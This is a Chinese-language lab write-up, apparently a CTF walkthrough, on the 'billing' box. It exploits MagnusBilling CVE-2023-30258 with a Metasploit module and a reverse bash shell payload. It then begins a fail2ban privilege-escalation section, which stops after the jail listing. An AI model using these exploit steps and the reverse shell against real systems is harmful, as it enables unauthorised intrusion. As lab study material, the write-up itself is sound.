---
icon: pen-to-square
date: 2025-03-26
tags: 
title: billing
category:
  - 项目
---
## 1. 前言
本题运用了简单的[CVE-2023-30258](https://eldstal.se/advisories/230327-magnusbilling.html)漏洞，这是一个简单的远程命令执行漏洞
## 2. 复现步骤
### 反弹shell
这个漏洞已经在msf中收录了
`msfconsole`

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110410.png)

```bash
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110506.png)

```bash
show targets
```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110536.png)

```bash
set PAYLOAD cmd/unix/reverse_bash
```
设置payload，然后设置Rhost Rport Lhost以及Lport
设置好监听接口以及payload之后，msf会自动接收反向shell
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112352.png)

### 提权
查看当前进程
```
ps -aux | grep fail
```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112734.png)

**fail2ban-client** 是一个命令行界面，它允许我们与 **fail2ban-server** 进行交互、配置和控制。简单说明一下，**fail2ban** 是一种安全工具，可以监控日志文件中的可疑活动（例如重复失败的登录尝试），并通过更新防火墙规则来禁止违规的 IP 地址。
使用 fail2ban-client，您可以与 Fail2ban 服务交互以执行作，例如启动或停止 jail、查看或更新设置以及检查服务器上不同 jail 的状态。从本质上讲，它可以帮助您控制服务器如何响应可疑活动以确保其安全。[Fail2Ban – Linux 权限提升 - Juggernaut-sec](https://juggernaut-sec.com/fail2ban-lpe/#What_is_Fail2Ban)

#### 提权原理
如果我们发现 Fail2ban 正在目标主机上运行，则必须满足以下条件才能提升权限：

1. 配置文件（**iptables-multiport.conf** 或 **iptables.conf** – 取决于版本）需要以某种方式可写。通常，这是用户/组权限、目录/文件权限或两者的某种组合的结果。
2. 无论如何，我们的当前用户需要能够重新启动服务，才能使对配置文件所做的更改生效。


`/etc/fail2ban/jail.local`，有这样的参数

|     |                                                                                                                                                                                                                    |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
|     | `[asterisk-iptables]`<br>enabled  = true<br>filter   = asterisk<br>action   = iptables-allports`[name=ASTERISK, port=all, protocol=all]`<br>logpath  = /var/log/asterisk/messages<br>maxretry = 5<br>bantime = 600 |
|     |                                                                                                                                                                                                                    |

```
sudo /usr/bin/fail2ban-client status
```
查看当前的监狱
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326113233.png)
有 8 个活动的 jail
`Jails`基本上是定义要监控的日志、要查找的模式以及匹配模式时要采取的作的配置。
